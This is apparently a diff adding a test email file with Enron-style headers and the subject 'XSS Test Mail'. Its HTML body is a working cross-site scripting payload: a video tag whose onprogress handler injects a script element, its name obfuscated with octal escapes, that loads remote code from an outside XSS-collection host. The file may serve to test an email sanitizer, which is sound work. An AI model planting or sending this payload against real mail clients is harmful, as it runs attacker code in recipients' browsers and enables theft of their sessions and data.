@@ -1,0 +1,7 @@
+From: heidi.withers@enron.com
+To: sutton.willard@enron.com, hamilton.wendell@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaa<video src=http://www.baidu.com/img/baidu_jgylogo3.gif onprogress=document.body.appendChild(document.createElement('scri\160\164')).src='http://xss.re/6896'>
